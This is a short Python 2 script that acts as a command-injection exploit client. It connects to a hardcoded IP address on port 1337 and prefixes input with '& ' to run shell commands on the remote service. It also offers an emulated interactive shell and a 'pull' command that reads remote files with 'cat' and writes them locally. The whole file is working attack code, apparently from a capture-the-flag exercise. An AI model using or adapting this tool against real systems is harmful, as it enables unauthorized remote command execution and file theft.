#!/usr/bin/python
import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
	
if __name__ == '__main__':
	while(1):
		cur_dir = "> "
		input = raw_input(cur_dir)
		list = input.split()
		
		if (list[0] == "shell"):
			cur_dir = "/> "
			input = raw_input(cur_dir)
			
			total = "& "
			total_len = 0
			while(input != "exit"):
				total = total + input + ";"
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				s.recv(1024)
				s.send(total + "\n")
				cur = s.recv(1024)
				print(cur[total_len:])
				total_len = len(cur)
				
				
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				s.recv(1024)
				s.send(total + "pwd;\n")
				dir = s.recv(1024)
				cur_dir = dir[dir.rstrip().rfind("\n") + 1:].rstrip() + "> "
				
				input = raw_input(cur_dir)
		elif (list[0] == "pull"):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.recv(1024)
			s.send("& cat" + list[1] + "\n")
			file_writing = s.recv(1024)
			f = open(list[2], "w")
			f.write(file_writing)
		elif (list[0] == "help"):
			print("1. shell Drop into an interactive shell and allow users to gracefully exit\n \
				   2. pull <remote-path> <local-path> Download files\n \
				   3. help Shows this help menu\n \
				   4. quit Quit the shell")
		elif (list[0] == "quit"):
			break
